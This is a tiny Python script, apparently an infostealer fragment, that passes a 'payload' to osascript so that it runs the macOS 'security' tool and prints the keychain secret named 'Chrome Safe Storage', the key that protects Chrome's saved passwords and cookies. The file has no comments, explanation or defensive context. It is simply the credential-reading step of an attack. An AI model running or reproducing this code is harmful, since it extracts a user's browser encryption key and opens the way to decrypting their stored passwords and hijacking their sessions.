import subprocess
payload = r'''
do shell script "security find-generic-password -w -s 'Chrome Safe Storage'"

'''
subprocess.run(['/usr/bin/osascript', '-e', payload], check=True)
